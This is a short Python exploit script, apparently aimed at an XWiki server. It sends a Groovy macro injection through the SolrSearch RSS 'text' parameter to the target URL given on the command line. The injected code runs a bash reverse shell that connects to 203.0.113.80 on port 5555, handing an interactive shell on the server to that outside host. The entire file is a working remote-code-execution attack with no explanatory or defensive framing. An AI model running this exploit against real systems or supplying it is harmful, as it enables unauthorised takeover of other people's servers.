import sys
from urllib.parse import urlencode
from urllib.request import urlopen

macro_text = '}}}{{async async=false}}{{groovy}}println("/bin/bash -i >& /dev/tcp/203.0.113.80/5555 0>&1".execute().text){{/groovy}}{{/async}}'
encoded_query = urlencode({"media": "rss", "text": macro_text})
urlopen(sys.argv[1].rstrip("/") + "/bin/get/Main/SolrSearch?" + encoded_query).read()
